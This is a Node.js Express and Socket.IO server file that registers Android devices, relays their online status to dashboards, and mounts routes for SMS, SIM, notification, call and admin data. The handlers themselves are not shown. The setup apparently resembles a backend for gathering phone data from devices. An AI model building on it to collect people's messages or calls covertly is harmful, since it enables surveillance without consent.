// =============================
// ✅ Import Modules
// =============================
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import { connectDB } from "./config/db.js";

// ✅ Import Routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";

// =============================
// ✅ Setup Environment & DB
// =============================
dotenv.config();
connectDB();

// =============================
// ✅ App & Server Setup
// =============================
const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// =============================
// ✅ SOCKET.IO REALTIME LOGIC
// =============================
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  // store current deviceId (so we know who disconnected)
  let currentDeviceId = null;

  // 🧩 Device registration from Android
  socket.on("registerDevice", (uniqueid) => {
    console.log(`📱 Registered Device: ${uniqueid}`);
    currentDeviceId = uniqueid;
    socket.join(uniqueid);
  });

  // ⚡ Real-time device status from Android app
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ ${uniqueid} → ${connectivity}`);

    // Broadcast to all dashboards / clients
    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });
  });

  // 📴 When device disconnects or app closes
  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected:", socket.id);

    if (currentDeviceId) {
      console.log(`📴 Marking ${currentDeviceId} as Offline`);

      // Notify all dashboards that device is offline
      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });

      // optional: save lastSeenAt in DB if you want
      // import Device from "./models/deviceModel.js";
      // await Device.findOneAndUpdate(
      //   { uniqueId: currentDeviceId },
      //   { lastSeenAt: new Date() }
      // );

      currentDeviceId = null;
    }
  });
});

// =============================
// ✅ Base Route
// =============================
app.get("/", (req, res) => {
  res.send("Hello my brother — Devices API with Live Socket is running fine! ⚡");
});

// =============================
// ✅ API Routes
// =============================
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/sim", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);

// =============================
// ✅ Error Handlers
// =============================
app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});


const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
